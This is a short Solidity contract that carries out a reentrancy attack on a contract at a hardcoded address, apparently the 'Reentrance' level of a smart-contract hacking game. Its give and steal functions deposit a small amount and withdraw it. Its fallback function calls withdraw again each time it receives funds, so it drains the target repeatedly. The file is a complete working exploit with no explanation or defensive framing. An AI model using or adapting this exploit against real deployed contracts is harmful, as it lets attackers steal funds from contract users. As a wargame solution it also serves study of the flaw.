//SPDX-License-Identifier: None

pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external returns (uint);
    function withdraw(uint _amount) external;
}

contract Reenter {
    Reentrance reentrance = Reentrance(0x945F30D680dA134940D47887319371Cd456A2521);

    constructor() payable {}

    function give() public {
        address to =  address(this);
        reentrance.donate{ value:500000000000000 }(to);
    }

    function steal() public {
        reentrance.withdraw( 500000000000000 );
    }
    
    fallback() external payable {
        reentrance.withdraw( 500000000000000 );
    }
}